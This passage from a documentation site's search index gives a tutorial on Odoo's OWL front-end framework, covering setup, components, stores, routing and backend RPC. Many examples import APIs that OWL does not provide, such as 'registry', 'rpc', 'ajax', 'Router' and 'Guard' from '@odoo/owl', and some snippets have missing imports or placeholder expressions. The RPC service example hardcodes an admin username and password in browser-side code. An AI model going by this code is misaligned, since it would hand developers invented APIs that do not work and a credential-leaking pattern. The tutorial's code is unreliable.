fluentd.yaml</code></p>"},{"location":"kubernetes/sheduler/#create-addidional-scheduler-from-file","title":"create addidional scheduler from file","text":"<p><code>kubectl create -n kube-system configmap my-scheduler-config --from-file=/root/my-scheduler-config.yaml</code></p>"},{"location":"odoo/owl/","title":"Advanced Odoo Development with OWL Framework: Best Practices, Optimizations, and Latest Features (Versions 16, 17, 18)","text":"<p>The Odoo Web Library (OWL) is Odoo's modern front-end framework, designed to enhance the user interface and user experience by leveraging contemporary web development practices. OWL brings reactive programming, component-based architecture, and improved performance to Odoo's front-end, enabling developers to build dynamic and responsive applications seamlessly integrated with Odoo's backend.</p> <p>This expert-level guide delves into the OWL framework within Odoo versions 16, 17, and 18, covering installation, component development, state management, performance optimization, security considerations, integration strategies, and the latest features introduced in these versions. Whether you're a seasoned Odoo developer or an IT professional aiming to harness OWL's full potential, this guide provides the insights necessary to build high-performance, secure, and scalable Odoo implementations using OWL.</p>"},{"location":"odoo/owl/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Introduction to OWL in Odoo</li> <li>OWL Framework Overview</li> <li>Setting Up OWL Development Environment</li> <li>Creating OWL Components</li> <li>State Management with OWL</li> <li>Routing with OWL</li> <li>Integrating OWL with Odoo's Backend</li> <li>Performance Optimization in OWL</li> <li>Best Practices for OWL Development</li> <li>Latest Features in OWL for Odoo 16, 17, 18</li> <li>Testing OWL Components</li> <li>Security Considerations in OWL</li> <li>Extending OWL with Custom Functionality</li> <li>Integration with External Libraries</li> <li>Deployment Strategies for OWL-based Odoo Modules</li> <li>Conclusion and Best Practices Summary</li> </ol>"},{"location":"odoo/owl/#1-introduction-to-owl-in-odoo","title":"1. Introduction to OWL in Odoo","text":""},{"location":"odoo/owl/#a-what-is-owl","title":"a. What is OWL?","text":"<p>OWL (Odoo Web Library) is Odoo's next-generation front-end framework inspired by modern JavaScript libraries like React and Vue.js. It introduces a component-based architecture, reactive data binding, and efficient rendering mechanisms to enhance Odoo's user interface capabilities.</p> <p>Key Features:</p> <ul> <li>Component-Based Architecture: Build reusable UI components.</li> <li>Reactivity: Automatic UI updates in response to state changes.</li> <li>Virtual DOM: Efficiently manage and render UI changes.</li> <li>Hooks: Manage component lifecycle and side effects.</li> <li>TypeScript Support: Enhanced type safety and developer tooling.</li> </ul>"},{"location":"odoo/owl/#b-evolution-of-owl-in-odoo","title":"b. Evolution of OWL in Odoo","text":"<p>OWL has been progressively integrated into Odoo to replace or enhance existing front-end components, providing a more streamlined and efficient development experience. Starting from experimental features in earlier versions, OWL has matured significantly by versions 16, 17, and 18, offering robust support and a comprehensive API for developers.</p>"},{"location":"odoo/owl/#2-owl-framework-overview","title":"2. OWL Framework Overview","text":""},{"location":"odoo/owl/#a-core-concepts","title":"a. Core Concepts","text":"<p>Understanding the core concepts of OWL is essential for effective development:</p> <ul> <li>Components: The building blocks of OWL applications, representing UI elements.</li> <li>Reactivity: OWL automatically tracks dependencies and updates the UI when state changes.</li> <li>Templates: Define the HTML structure of components using OWL's templating syntax.</li> <li>Hooks: Functions that manage component lifecycle events (similar to React Hooks).</li> <li>Stores: Centralized state management (can integrate with Odoo's ORM or external stores).</li> </ul>"},{"location":"odoo/owl/#b-comparison-with-other-frameworks","title":"b. Comparison with Other Frameworks","text":"<p>OWL draws inspiration from frameworks like React and Vue.js but is tailored specifically for Odoo's architecture and requirements. Unlike these frameworks, OWL is deeply integrated with Odoo's backend, ensuring seamless data binding and interaction with Odoo models.</p>"},{"location":"odoo/owl/#3-setting-up-owl-development-environment","title":"3. Setting Up OWL Development Environment","text":""},{"location":"odoo/owl/#a-prerequisites","title":"a. Prerequisites","text":"<p>Before diving into OWL development, ensure that your environment is set up correctly:</p> <ul> <li>Odoo Installation: Versions 16, 17, or 18 installed and configured.</li> <li>Node.js and npm: For managing front-end dependencies.</li> <li>TypeScript: Recommended for type safety and enhanced tooling.</li> <li>Development Tools: IDE (e.g., VSCode), Git, and other standard development tools.</li> </ul>"},{"location":"odoo/owl/#b-installing-dependencies","title":"b. Installing Dependencies","text":"<ol> <li> <p>Install Node.js and npm: <pre><code>sudo apt update\nsudo apt install nodejs npm -y\n</code></pre>     Verify installation:     <pre><code>node -v\nnpm -v\n</code></pre></p> </li> <li> <p>Install TypeScript Globally: <pre><code>npm install -g typescript\n</code></pre>     Verify installation:     <pre><code>tsc -v\n</code></pre></p> </li> <li> <p>Set Up Odoo Addons Directory:     Navigate to your Odoo addons directory where your custom modules reside.     <pre><code>cd /path/to/odoo/addons\n</code></pre></p> </li> <li> <p>Initialize a Custom Module:     Use Odoo's scaffolding tool to create a new module.     <pre><code>odoo-bin scaffold my_owl_module\n</code></pre></p> </li> <li> <p>Navigate to Module Directory: <pre><code>cd my_owl_module\n</code></pre></p> </li> <li> <p>Initialize npm and Install OWL Dependencies: <pre><code>npm init -y\nnpm install @odoo/owl --save\nnpm install typescript --save-dev\n</code></pre></p> </li> <li> <p>Configure TypeScript:     Create a <code>tsconfig.json</code> file in your module directory.     <pre><code>{\n  \"compilerOptions\": {\n    \"target\": \"ES6\",\n    \"module\": \"ES6\",\n    \"moduleResolution\": \"node\",\n    \"outDir\": \"static/src/js\",\n    \"rootDir\": \"static/src/ts\",\n    \"strict\": true,\n    \"esModuleInterop\": true\n  },\n  \"include\": [\"static/src/ts/**/*\"]\n}\n</code></pre></p> </li> <li> <p>Create Directory Structure for OWL: <pre><code>mkdir -p static/src/ts/components\nmkdir -p static/src/ts/stores\n</code></pre></p> </li> <li> <p>Set Up Build Scripts:     Add the following scripts to your <code>package.json</code>:     <pre><code>\"scripts\": {\n  \"build\": \"tsc\",\n  \"watch\": \"tsc -w\"\n}\n</code></pre></p> </li> <li> <p>Compile TypeScript to JavaScript: <pre><code>npm run build\n</code></pre></p> <p>Or, to watch for changes: <pre><code>npm run watch\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#4-creating-owl-components","title":"4. Creating OWL Components","text":"<p>Creating components is fundamental to building applications with OWL. Components encapsulate the UI elements and their behavior, promoting reusability and maintainability.</p>"},{"location":"odoo/owl/#a-component-structure","title":"a. Component Structure","text":"<p>An OWL component typically consists of:</p> <ul> <li>Template: Defines the HTML structure.</li> <li>Styles: (Optional) Defines the CSS for the component.</li> <li>Logic: Defines the JavaScript/TypeScript logic for the component.</li> </ul>"},{"location":"odoo/owl/#b-example-creating-a-simple-greeting-component","title":"b. Example: Creating a Simple Greeting Component","text":"<ol> <li> <p>Define the Template:     Create a file <code>GreetingComponent.ts</code> inside <code>static/src/ts/components/</code>.     <pre><code>// static/src/ts/components/GreetingComponent.ts\nimport { Component } from '@odoo/owl';\n\nexport class GreetingComponent extends Component {\n  static template = 'my_owl_module.GreetingComponent';\n\n  greet() {\n    alert(`Hello, ${this.props.name}!`);\n  }\n}\n</code></pre></p> </li> <li> <p>Define the Template in XML:     Create a file <code>greeting_template.xml</code> inside <code>views/</code>.     <pre><code>&lt;!-- views/greeting_template.xml --&gt;\n&lt;templates&gt;\n  &lt;t t-name=\"my_owl_module.GreetingComponent\"&gt;\n    &lt;div class=\"greeting\"&gt;\n      &lt;p&gt;Hello, &lt;t t-esc=\"props.name\"/&gt;!&lt;/p&gt;\n      &lt;button t-on-click=\"greet\"&gt;Greet&lt;/button&gt;\n    &lt;/div&gt;\n  &lt;/t&gt;\n&lt;/templates&gt;\n</code></pre></p> </li> <li> <p>Register the Template:     Include the template in your module's assets.     <pre><code>&lt;!-- views/assets.xml --&gt;\n&lt;odoo&gt;\n  &lt;template id=\"assets_backend\" name=\"my_owl_module assets\" inherit_id=\"web.assets_backend\"&gt;\n    &lt;xpath expr=\".\" position=\"inside\"&gt;\n      &lt;script type=\"module\" src=\"/my_owl_module/static/src/js/main.js\"&gt;&lt;/script&gt;\n      &lt;t t-call=\"my_owl_module.greeting_template\"/&gt;\n    &lt;/xpath&gt;\n  &lt;/template&gt;\n&lt;/odoo&gt;\n</code></pre></p> </li> <li> <p>Initialize and Mount the Component:     Create a <code>main.ts</code> file inside <code>static/src/ts/</code>.     <pre><code>// static/src/ts/main.ts\nimport { registry } from '@odoo/owl';\nimport { GreetingComponent } from './components/GreetingComponent';\n\nregistry.category('actions').add('greeting_component', GreetingComponent);\n\nconst app = registry.category('apps').get('web.App');\napp.components.add('greeting_component', GreetingComponent);\n\napp.mount('#greeting_app');\n</code></pre></p> </li> <li> <p>Compile TypeScript: <pre><code>npm run build\n</code></pre></p> </li> <li> <p>Use the Component in a QWeb Template:     Modify an existing view or create a new one to include the component.     <pre><code>&lt;!-- views/my_model_views.xml --&gt;\n&lt;odoo&gt;\n  &lt;record id=\"view_my_model_form\" model=\"ir.ui.view\"&gt;\n    &lt;field name=\"name\"&gt;my.model.form&lt;/field&gt;\n    &lt;field name=\"model\"&gt;my.model&lt;/field&gt;\n    &lt;field name=\"arch\" type=\"xml\"&gt;\n      &lt;form string=\"My Model\"&gt;\n        &lt;sheet&gt;\n          &lt;group&gt;\n            &lt;field name=\"name\"/&gt;\n          &lt;/group&gt;\n          &lt;div id=\"greeting_app\"/&gt;\n        &lt;/sheet&gt;\n      &lt;/form&gt;\n    &lt;/field&gt;\n  &lt;/record&gt;\n&lt;/odoo&gt;\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#c-styling-components","title":"c. Styling Components","text":"<p>OWL allows you to style components using standard CSS. You can include styles directly within your component's template or link external CSS files.</p> <p>Example: Adding Styles to the Greeting Component</p> <ol> <li> <p>Define Styles in CSS:     Create a <code>greeting_styles.css</code> file inside <code>static/src/css/</code>.     <pre><code>/* static/src/css/greeting_styles.css */\n.greeting {\n  padding: 10px;\n  background-color: #f0f0f0;\n  border-radius: 5px;\n}\n\n.greeting p {\n  font-size: 16px;\n  color: #333;\n}\n\n.greeting button {\n  padding: 5px 10px;\n  background-color: #007bff;\n  color: #fff;\n  border: none;\n  border-radius: 3px;\n  cursor: pointer;\n}\n\n.greeting button:hover {\n  background-color: #0056b3;\n}\n</code></pre></p> </li> <li> <p>Include Styles in Assets: <pre><code>&lt;!-- views/assets.xml --&gt;\n&lt;odoo&gt;\n  &lt;template id=\"assets_backend\" name=\"my_owl_module assets\" inherit_id=\"web.assets_backend\"&gt;\n    &lt;xpath expr=\".\" position=\"inside\"&gt;\n      &lt;link rel=\"stylesheet\" href=\"/my_owl_module/static/src/css/greeting_styles.css\"/&gt;\n    &lt;/xpath&gt;\n  &lt;/template&gt;\n&lt;/odoo&gt;\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#5-state-management-with-owl","title":"5. State Management with OWL","text":"<p>Effective state management is crucial for building scalable and maintainable applications. OWL offers several strategies to manage state within components and across the application.</p>"},{"location":"odoo/owl/#a-local-state","title":"a. Local State","text":"<p>Components can maintain their own internal state using properties and reactive signals.</p> <p>Example: Managing Local State in GreetingComponent</p> <pre><code>// static/src/ts/components/GreetingComponent.ts\nimport { Component, useState } from '@odoo/owl';\n\nexport class GreetingComponent extends Component {\n  static template = 'my_owl_module.GreetingComponent';\n\n  setup() {\n    this.state = useState({\n      count: 0,\n    });\n  }\n\n  greet() {\n    this.state.count += 1;\n    alert(`Hello, ${this.props.name}! You've been greeted ${this.state.count} times.`);\n  }\n}\n</code></pre>"},{"location":"odoo/owl/#b-shared-state-with-stores","title":"b. Shared State with Stores","text":"<p>For managing state across multiple components, using a centralized store is recommended.</p> <p>Example: Creating a Shared Store</p> <ol> <li> <p>Define the Store: <pre><code>// static/src/ts/stores/GreetingStore.ts\nimport { reactive } from '@odoo/owl';\n\nexport const GreetingStore = reactive({\n  totalGreetings: 0,\n  incrementGreetings() {\n    this.totalGreetings += 1;\n  },\n});\n</code></pre></p> </li> <li> <p>Use the Store in a Component: <pre><code>// static/src/ts/components/GreetingComponent.ts\nimport { Component } from '@odoo/owl';\nimport { GreetingStore } from '../stores/GreetingStore';\n\nexport class GreetingComponent extends Component {\n  static template = 'my_owl_module.GreetingComponent';\n\n  greet() {\n    GreetingStore.incrementGreetings();\n    alert(`Hello, ${this.props.name}! Total Greetings: ${GreetingStore.totalGreetings}`);\n  }\n}\n</code></pre></p> </li> <li> <p>Display Shared State in Another Component: <pre><code>// static/src/ts/components/GreetingCounter.ts\nimport { Component } from '@odoo/owl';\nimport { GreetingStore } from '../stores/GreetingStore';\n\nexport class GreetingCounter extends Component {\n  static template = 'my_owl_module.GreetingCounter';\n\n  setup() {\n    this.state = GreetingStore;\n  }\n}\n</code></pre></p> </li> <li> <p>Define the Counter Template: <pre><code>&lt;!-- views/greeting_counter_template.xml --&gt;\n&lt;templates&gt;\n  &lt;t t-name=\"my_owl_module.GreetingCounter\"&gt;\n    &lt;div class=\"counter\"&gt;\n      Total Greetings: &lt;t t-esc=\"state.totalGreetings\"/&gt;\n    &lt;/div&gt;\n  &lt;/t&gt;\n&lt;/templates&gt;\n</code></pre></p> </li> <li> <p>Include the Counter Component in a View: <pre><code>&lt;!-- views/my_model_views.xml --&gt;\n&lt;odoo&gt;\n  &lt;record id=\"view_my_model_form\" model=\"ir.ui.view\"&gt;\n    &lt;field name=\"name\"&gt;my.model.form&lt;/field&gt;\n    &lt;field name=\"model\"&gt;my.model&lt;/field&gt;\n    &lt;field name=\"arch\" type=\"xml\"&gt;\n      &lt;form string=\"My Model\"&gt;\n        &lt;sheet&gt;\n          &lt;group&gt;\n            &lt;field name=\"name\"/&gt;\n          &lt;/group&gt;\n          &lt;div id=\"greeting_app\"/&gt;\n          &lt;div id=\"greeting_counter_app\"/&gt;\n        &lt;/sheet&gt;\n      &lt;/form&gt;\n    &lt;/field&gt;\n  &lt;/record&gt;\n&lt;/odoo&gt;\n</code></pre></p> </li> <li> <p>Mount the Counter Component:     Update <code>main.ts</code> to mount both components.     <pre><code>// static/src/ts/main.ts\nimport { registry } from '@odoo/owl';\nimport { GreetingComponent } from './components/GreetingComponent';\nimport { GreetingCounter } from './components/GreetingCounter';\n\nregistry.category('actions').add('greeting_component', GreetingComponent);\nregistry.category('actions').add('greeting_counter', GreetingCounter);\n\nconst app = registry.category('apps').get('web.App');\napp.components.add('greeting_component', GreetingComponent);\napp.components.add('greeting_counter', GreetingCounter);\n\napp.mount('#greeting_app');\napp.mount('#greeting_counter_app');\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#c-integrating-with-odoos-orm","title":"c. Integrating with Odoo's ORM","text":"<p>To synchronize OWL's state with Odoo's backend models, leverage Odoo's RPC (Remote Procedure Call) APIs.</p> <p>Example: Fetching Data from Odoo's Backend</p> <ol> <li> <p>Create a Service for RPC Calls: <pre><code>// static/src/ts/services/RPCService.ts\nimport { rpc } from '@odoo/owl';\n\nexport class RPCService {\n  async fetchPartners() {\n    return await rpc.query({\n      model: 'res.partner',\n      method: 'search_read',\n      args: [[]],\n      kwargs: { fields: ['name', 'email'] },\n    });\n  }\n}\n</code></pre></p> </li> <li> <p>Use the Service in a Component: <pre><code>// static/src/ts/components/PartnerListComponent.ts\nimport { Component, useState } from '@odoo/owl';\nimport { RPCService } from '../services/RPCService';\n\nexport class PartnerListComponent extends Component {\n  static template = 'my_owl_module.PartnerListComponent';\n\n  setup() {\n    this.state = useState({\n      partners: [],\n      loading: true,\n    });\n    this.loadPartners();\n  }\n\n  async loadPartners() {\n    const service = new RPCService();\n    this.state.partners = await service.fetchPartners();\n    this.state.loading = false;\n  }\n}\n</code></pre></p> </li> <li> <p>Define the Partner List Template: <pre><code>&lt;!-- views/partner_list_template.xml --&gt;\n&lt;templates&gt;\n  &lt;t t-name=\"my_owl_module.PartnerListComponent\"&gt;\n    &lt;div class=\"partner-list\"&gt;\n      &lt;h2&gt;Partners&lt;/h2&gt;\n      &lt;t t-if=\"state.loading\"&gt;\n        &lt;p&gt;Loading partners...&lt;/p&gt;\n      &lt;/t&gt;\n      &lt;t t-else&gt;\n        &lt;ul&gt;\n          &lt;li t-foreach=\"state.partners\" t-as=\"partner\"&gt;\n            &lt;strong&gt;&lt;t t-esc=\"partner.name\"/&gt;&lt;/strong&gt; - &lt;t t-esc=\"partner.email\"/&gt;\n          &lt;/li&gt;\n        &lt;/ul&gt;\n      &lt;/t&gt;\n    &lt;/div&gt;\n  &lt;/t&gt;\n&lt;/templates&gt;\n</code></pre></p> </li> <li> <p>Include the Partner List Component in a View: <pre><code>&lt;!-- views/my_model_views.xml --&gt;\n&lt;odoo&gt;\n  &lt;record id=\"view_my_model_form\" model=\"ir.ui.view\"&gt;\n    &lt;field name=\"name\"&gt;my.model.form&lt;/field&gt;\n    &lt;field name=\"model\"&gt;my.model&lt;/field&gt;\n    &lt;field name=\"arch\" type=\"xml\"&gt;\n      &lt;form string=\"My Model\"&gt;\n        &lt;sheet&gt;\n          &lt;group&gt;\n            &lt;field name=\"name\"/&gt;\n          &lt;/group&gt;\n          &lt;div id=\"partner_list_app\"/&gt;\n        &lt;/sheet&gt;\n      &lt;/form&gt;\n    &lt;/field&gt;\n  &lt;/record&gt;\n&lt;/odoo&gt;\n</code></pre></p> </li> <li> <p>Mount the Partner List Component:     Update <code>main.ts</code> to mount the new component.     <pre><code>// static/src/ts/main.ts\nimport { registry } from '@odoo/owl';\nimport { GreetingComponent } from './components/GreetingComponent';\nimport { GreetingCounter } from './components/GreetingCounter';\nimport { PartnerListComponent } from './components/PartnerListComponent';\n\nregistry.category('actions').add('greeting_component', GreetingComponent);\nregistry.category('actions').add('greeting_counter', GreetingCounter);\nregistry.category('actions').add('partner_list', PartnerListComponent);\n\nconst app = registry.category('apps').get('web.App');\napp.components.add('greeting_component', GreetingComponent);\napp.components.add('greeting_counter', GreetingCounter);\napp.components.add('partner_list', PartnerListComponent);\n\napp.mount('#greeting_app');\napp.mount('#greeting_counter_app');\napp.mount('#partner_list_app');\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#6-routing-with-owl","title":"6. Routing with OWL","text":"<p>Managing navigation and routing within OWL-based applications ensures a seamless user experience. OWL provides routing capabilities that can be integrated with Odoo's existing routing mechanisms.</p>"},{"location":"odoo/owl/#a-setting-up-owl-router","title":"a. Setting Up OWL Router","text":"<p>OWL's routing system allows defining routes and rendering components based on the current URL.</p> <p>Example: Defining Routes</p> <ol> <li> <p>Define the Routes: <pre><code>// static/src/ts/routes.ts\nimport { Route, Router } from '@odoo/owl';\nimport { GreetingComponent } from './components/GreetingComponent';\nimport { PartnerListComponent } from './components/PartnerListComponent';\n\nexport const routes: Route[] = [\n  { path: '/', component: GreetingComponent },\n  { path: '/partners', component: PartnerListComponent },\n];\n</code></pre></p> </li> <li> <p>Initialize the Router: <pre><code>// static/src/ts/main.ts\nimport { registry } from '@odoo/owl';\nimport { Router } from '@odoo/owl';\nimport { GreetingComponent } from './components/GreetingComponent';\nimport { PartnerListComponent } from './components/PartnerListComponent';\nimport { routes } from './routes';\n\nregistry.category('actions').add('greeting_component', GreetingComponent);\nregistry.category('actions').add('partner_list', PartnerListComponent);\n\nconst router = new Router(routes);\nrouter.mount('#app');\n\n// Optional: Handle navigation\ndocument.addEventListener('click', (event) =&gt; {\n  const target = event.target as HTMLElement;\n  if (target.tagName === 'A' &amp;&amp; target.getAttribute('href')?.startsWith('/')) {\n    event.preventDefault();\n    const path = target.getAttribute('href');\n    router.navigate(path!);\n  }\n});\n</code></pre></p> </li> <li> <p>Define the Main App Template: <pre><code>&lt;!-- views/main_app_template.xml --&gt;\n&lt;templates&gt;\n  &lt;t t-name=\"my_owl_module.MainApp\"&gt;\n    &lt;nav&gt;\n      &lt;a href=\"/\"&gt;Home&lt;/a&gt;\n      &lt;a href=\"/partners\"&gt;Partners&lt;/a&gt;\n    &lt;/nav&gt;\n    &lt;div id=\"app\"/&gt;\n  &lt;/t&gt;\n&lt;/templates&gt;\n</code></pre></p> </li> <li> <p>Include the Main App in Assets: <pre><code>&lt;!-- views/assets.xml --&gt;\n&lt;odoo&gt;\n  &lt;template id=\"assets_backend\" name=\"my_owl_module assets\" inherit_id=\"web.assets_backend\"&gt;\n    &lt;xpath expr=\".\" position=\"inside\"&gt;\n      &lt;t t-call=\"my_owl_module.main_app_template\"/&gt;\n    &lt;/xpath&gt;\n  &lt;/template&gt;\n&lt;/odoo&gt;\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#b-nested-routes","title":"b. Nested Routes","text":"<p>OWL supports nested routing, allowing complex UI structures with nested components.</p> <p>Example: Defining Nested Routes</p> <ol> <li> <p>Update Routes: <pre><code>// static/src/ts/routes.ts\nimport { Route } from '@odoo/owl';\nimport { GreetingComponent } from './components/GreetingComponent';\nimport { PartnerListComponent } from './components/PartnerListComponent';\nimport { PartnerDetailComponent } from './components/PartnerDetailComponent';\n\nexport const routes: Route[] = [\n  {\n    path: '/',\n    component: GreetingComponent,\n  },\n  {\n    path: '/partners',\n    component: PartnerListComponent,\n    children: [\n      {\n        path: '/:id',\n        component: PartnerDetailComponent,\n      },\n    ],\n  },\n];\n</code></pre></p> </li> <li> <p>Create Partner Detail Component: <pre><code>// static/src/ts/components/PartnerDetailComponent.ts\nimport { Component } from '@odoo/owl';\nimport { RPCService } from '../services/RPCService';\n\nexport class PartnerDetailComponent extends Component {\n  static template = 'my_owl_module.PartnerDetailComponent';\n\n  setup() {\n    this.state = useState({\n      partner: null,\n      loading: true,\n    });\n    this.loadPartner();\n  }\n\n  async loadPartner() {\n    const service = new RPCService();\n    const params = this.props.params;\n    this.state.partner = await service.fetchPartnerById(params.id);\n    this.state.loading = false;\n  }\n}\n</code></pre></p> </li> <li> <p>Define the Partner Detail Template: <pre><code>&lt;!-- views/partner_detail_template.xml --&gt;\n&lt;templates&gt;\n  &lt;t t-name=\"my_owl_module.PartnerDetailComponent\"&gt;\n    &lt;div class=\"partner-detail\"&gt;\n      &lt;t t-if=\"state.loading\"&gt;\n        &lt;p&gt;Loading partner details...&lt;/p&gt;\n      &lt;/t&gt;\n      &lt;t t-else&gt;\n        &lt;h3&gt;&lt;t t-esc=\"state.partner.name\"/&gt;&lt;/h3&gt;\n        &lt;p&gt;Email: &lt;t t-esc=\"state.partner.email\"/&gt;&lt;/p&gt;\n        &lt;!-- Add more details as needed --&gt;\n      &lt;/t&gt;\n    &lt;/div&gt;\n  &lt;/t&gt;\n&lt;/templates&gt;\n</code></pre></p> </li> <li> <p>Mount Nested Routes:     Ensure that nested routes are rendered within their parent components.</p> <pre><code>// static/src/ts/main.ts\nimport { registry } from '@odoo/owl';\nimport { Router } from '@odoo/owl';\nimport { GreetingComponent } from './components/GreetingComponent';\nimport { PartnerListComponent } from './components/PartnerListComponent';\nimport { PartnerDetailComponent } from './components/PartnerDetailComponent';\nimport { routes } from './routes';\n\nregistry.category('actions').add('greeting_component', GreetingComponent);\nregistry.category('actions').add('partner_list', PartnerListComponent);\nregistry.category('actions').add('partner_detail', PartnerDetailComponent);\n\nconst router = new Router(routes);\nrouter.mount('#app');\n\n// Handle navigation as before\ndocument.addEventListener('click', (event) =&gt; {\n  const target = event.target as HTMLElement;\n  if (target.tagName === 'A' &amp;&amp; target.getAttribute('href')?.startsWith('/')) {\n    event.preventDefault();\n    const path = target.getAttribute('href');\n    router.navigate(path!);\n  }\n});\n</code></pre> </li> </ol>"},{"location":"odoo/owl/#c-navigation-guards","title":"c. Navigation Guards","text":"<p>Implement navigation guards to protect routes or perform actions before entering or leaving routes.</p> <p>Example: Implementing a Navigation Guard</p> <ol> <li> <p>Define the Guard: <pre><code>// static/src/ts/guards/AuthGuard.ts\nimport { Guard } from '@odoo/owl';\n\nexport class AuthGuard extends Guard {\n  beforeRouteChange({ to, from, next }: any) {\n    const isAuthenticated = /* Implement your authentication check */;\n    if (!isAuthenticated &amp;&amp; to.path !== '/') {\n      next('/');\n    } else {\n      next();\n    }\n  }\n}\n</code></pre></p> </li> <li> <p>Apply the Guard to Routes: <pre><code>// static/src/ts/routes.ts\nimport { Route } from '@odoo/owl';\nimport { GreetingComponent } from './components/GreetingComponent';\nimport { PartnerListComponent } from './components/PartnerListComponent';\nimport { PartnerDetailComponent } from './components/PartnerDetailComponent';\nimport { AuthGuard } from './guards/AuthGuard';\n\nexport const routes: Route[] = [\n  {\n    path: '/',\n    component: GreetingComponent,\n  },\n  {\n    path: '/partners',\n    component: PartnerListComponent,\n    beforeEnter: [AuthGuard],\n    children: [\n      {\n        path: '/:id',\n        component: PartnerDetailComponent,\n        beforeEnter: [AuthGuard],\n      },\n    ],\n  },\n];\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#7-integrating-owl-with-odoos-backend","title":"7. Integrating OWL with Odoo's Backend","text":"<p>Seamless integration between OWL's front-end components and Odoo's backend models is crucial for building dynamic and data-driven applications.</p>"},{"location":"odoo/owl/#a-using-rpc-for-data-communication","title":"a. Using RPC for Data Communication","text":"<p>OWL interacts with Odoo's backend primarily through RPC (Remote Procedure Call) mechanisms, such as JSON-RPC or XML-RPC.</p> <p>Example: Fetching Data Using JSON-RPC</p> <ol> <li> <p>Create an RPC Service: <pre><code>// static/src/ts/services/RPCService.ts\nimport { ajax } from '@odoo/owl';\n\nexport class RPCService {\n  private url: string;\n  private db: string;\n  private username: string;\n  private password: string;\n  private uid: number | null;\n\n  constructor() {\n    this.url = '/jsonrpc';\n    this.db = 'your_database';\n    this.username = 'admin';\n    this.password = 'admin_password';\n    this.uid = null;\n  }\n\n  async authenticate() {\n    const response = await ajax.jsonRpc(this.url, 'call', {\n      service: 'common',\n      method: 'authenticate',\n      args: [this.db, this.username, this.password, {}],\n    });\n    this.uid = response;\n  }\n\n  async call(model: string, method: string, args: any[], kwargs: any = {}) {\n    if (this.uid === null) {\n      await this.authenticate();\n    }\n    return await ajax.jsonRpc(this.url, 'call', {\n      service: 'object',\n      method: 'execute_kw',\n      args: [this.db, this.uid, this.password, model, method, args, kwargs],\n    });\n  }\n\n  async fetchPartners() {\n    return await this.call('res.partner', 'search_read', [[]], { fields: ['name', 'email'] });\n  }\n\n  async fetchPartnerById(id: number) {\n    return await this.call('res.partner', 'read', [[id]], { fields: ['name', 'email'] });\n  }\n}\n</code></pre></p> </li> <li> <p>Use the RPC Service in Components: <pre><code>// static/src/ts/components/PartnerListComponent.ts\nimport { Component, useState } from '@odoo/owl';\nimport { RPCService } from '../services/RPCService';\n\nexport class PartnerListComponent extends Component {\n  static template = 'my_owl_module.PartnerListComponent';\n\n  setup() {\n    this.state = useState({\n      partners: [],\n      loading: true,\n    });\n    this.loadPartners();\n  }\n\n  async loadPartners() {\n    const service = new RPCService();\n    this.state.partners = await service.fetchPartners();\n    this.state.loading = false;\n  }\n}\n</code></pre></p> </li> </ol>"},{"location":"odoo/owl/#b-handling-crud-operations","title":"b. Handling CRUD Operations","text":"<p>Implement Create, Read, Update, and Delete operations by interacting with Odoo's models through the RPC service.</p> <p>Example: Creating a New Partner</p> <ol> <li> <p>Add a Method in RPCService: <pre><code>// static/src/ts/services/RPCService.ts\nasync createPartner(data: any) {\n  return await this.call('res.partner', 'create', [data]);\n}\n</code></pre></p> </li> <li> <p>Use the Method in a Component: <pre><code>// static/src/ts/components/CreatePartnerComponent.ts\nimport { Component, useState } from '@odoo/owl';\nimport { RPCService } from '../services/RPCService';\n\nexport class CreatePartnerComponent extends Component {\n  static template = 'my_owl_module.CreatePartnerComponent';\n\n  setup() {\n    this.state = useState({\n      name: '',\n      email: '',\n    });\n  }\n\n  async createPartner() {\n    const service = new RPCService();\n    const newPartnerId = await service.createPartner({\n      name: this.state.name,\n      email: this.state.email,\n    });\n    alert(`Partner Created with ID: ${newPartnerId}`);\n    // Optionally, reset the form or navigate to the partner list\n  }\n}\n</code></pre></p> </li> <li> <p>Define the Create Partner Template: <pre><code>&lt;!-- views/create_partner_template.xml --&gt;\n&lt;templates&gt;\n  &lt;t t-name=\"my_owl_module.CreatePartnerComponent\"&gt;\n    &lt;div class=\"create-partner\"&gt;\n      &lt;h2&gt;Create New Partner&lt;/h2&gt;\n      &lt;input type=\"text\" t-model=\"state.name\" placeholder=\"Name\"/&gt;\n      &lt;input type=\"email\" t-model=\"state.email\" placeholder=\"Email\"/&gt;\n      &lt;button t-on-click=\"createPartner\"&gt;Create Partner&lt;/button&gt;\n    &lt;/div&gt;\n  &lt;/t&gt;\n&lt;/templates&gt;\n</code></pre></p> </li> <li> <p>Include the Create Partner Component in a View: <pre><code>&lt;!-- views/my_model_views.xml --&gt;\n&lt;odoo&gt;\n  &lt;record id=\"view_my_model_form\" model=\"ir.ui.view\"&gt;\n    &lt;field name=\"name\"&gt;my.model.form&lt;/field&gt;\n    &lt;field name=\"model\"&gt;my.model&lt;/field&gt;\n    &lt;field name=\"arch\" type=\"xml\"&gt;\n      &lt;form string=\"My Model\"&gt;\n        &lt;sheet&gt;\n          &lt;group&gt;\n            &lt;field name=\"name\"/&gt;\n          &lt;/group&gt;\n          &lt;div id=\"create_partner_app\"/&gt;\n        &lt;/sheet&gt;\n      &lt;/form&gt;\n    &lt;/field&gt;\n  &lt;/record&gt;\n&lt;/odoo&gt;\n</code></pre></p> </li> <li> <p>Mount the Create Partner Component:     Update <code>main.ts</code> to mount the new component.     <pre><code>// static/src/ts/main.ts\nimport { registry } from '@odoo/owl';\nimport { Router } from '@odoo/owl';\nimport { GreetingComponent } from './components/GreetingComponent';\nimport { GreetingCounter } from './components/GreetingCounter';\nimport { PartnerListComponent } from './components/PartnerListComponent';\nimport { PartnerDetailComponent } from './components/PartnerDetailComponent';\nimport { CreatePartnerComponent } from './components/CreatePartnerComponent';\nimport { routes } from './routes';\n\nregistry.category('actions').add('greeting_component', GreetingComponent);\nregistry.category('actions').add('greeting_counter', GreetingCounter);\nregistry.category('actions').add('partner_list', PartnerListComponent);\nregistry.category('actions').add('partner_detail', PartnerDetailComponent);\nregistry.category('actions').add('create_partner', CreatePartnerComponent);\n\nconst router = new Router(routes);\nrouter.mount('#app');\n\n// Handle navigation as 